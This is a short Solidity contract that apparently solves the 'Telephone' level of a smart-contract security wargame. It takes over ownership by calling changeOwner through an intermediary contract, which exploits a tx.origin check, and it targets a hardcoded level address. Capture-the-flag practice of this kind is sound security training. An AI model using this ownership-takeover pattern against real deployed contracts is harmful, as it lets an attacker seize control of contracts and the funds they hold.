// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/levels/04-Telephone/Telephone.sol";

contract Tele {
    Telephone level4 = Telephone(0x23485539AcF0d51EBa27d7feCcB766775E351F14);

    function exploit() external {
        level4.changeOwner(0x7A30be98aFCeA6cf186751546af0C563e1e8Ae08);     
    }
}